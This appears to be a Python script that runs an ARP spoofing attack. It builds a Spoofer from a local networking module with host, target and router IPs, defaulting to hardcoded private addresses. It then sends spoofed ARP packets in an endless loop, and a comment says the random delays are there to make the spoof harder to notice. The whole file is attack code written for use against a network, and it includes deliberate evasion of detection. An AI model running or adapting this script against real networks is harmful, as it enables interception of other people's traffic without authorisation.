DEBUG = False

import threading
import sys
import signal
import time
import random

from networking import Spoofer

if (len(sys.argv) != 4):
    
    if DEBUG:
        print(f"Wrong usage of arp_spoofer.py. Usage- arp_spoofer.py <host_ip> <target_ip> <router_ip> and not {sys.argv}")
        sys.exit(0)
    else:
        sys.argv = ["spoof.py", "172.17.170.103","172.17.170.103","172.17.160.1"]




def spoof(spoofer: Spoofer):
    if DEBUG:
        while True:
            print("Sent spoofing packet.... (not really)")
            time.sleep(3)
    else:
        while True:
            spoofer.send_spoofed_packet()
            time.sleep(random.random()/10) # wait a random number between 0-0.1
            # The time.sleep has 2 jobs -
            #   first, make the spoof harder to notice.
            #   second, the terminating signal can only be received if the process is waiting, and not running.
            #       thus, without the time the signal wouldn't be registered.





if __name__ == "__main__":
    if DEBUG:
        print("Running spoof.py on debug mode.")
    spoofer = Spoofer(*sys.argv[1:])
    spoof(spoofer)

